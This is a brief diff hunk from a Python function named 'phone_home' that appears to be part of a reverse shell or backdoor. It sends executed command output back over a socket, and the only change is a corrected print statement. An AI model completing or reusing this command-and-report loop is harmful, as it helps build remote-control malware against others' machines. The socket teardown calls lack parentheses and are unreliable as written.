@@ -46,7 +46,7 @@ def phone_home():
                 else:
                     cmd_return = (str(c) + "\n" + str(execute.stdout))
                     s.sendall(bytes(cmd_return, "utf-8"))
-            print("Told dad all about", cmd), "!"
+            print("Told dad all about", cmd, "!")
     s.close
     s.shutdown
     s = None
